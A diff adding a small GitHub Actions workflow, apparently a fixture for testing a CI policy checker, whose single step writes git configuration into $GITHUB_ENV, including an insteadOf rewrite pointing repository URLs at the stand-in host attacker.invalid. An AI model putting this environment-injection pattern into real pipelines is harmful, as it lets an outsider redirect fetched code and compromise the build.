@@ -1,0 +1,13 @@
+on:
+  pull_request:
+concurrency: policy
+permissions:
+  contents: read
+jobs:
+  verify:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 10
+    steps:
+      - run: |
+          printf '%s\n' 'GIT_CONFIG_COUNT=1' >> "$GITHUB_ENV"
+          printf '%s\n' 'GIT_CONFIG_KEY_0=url.https://attacker.invalid/.insteadOf' >> "$GITHUB_ENV"
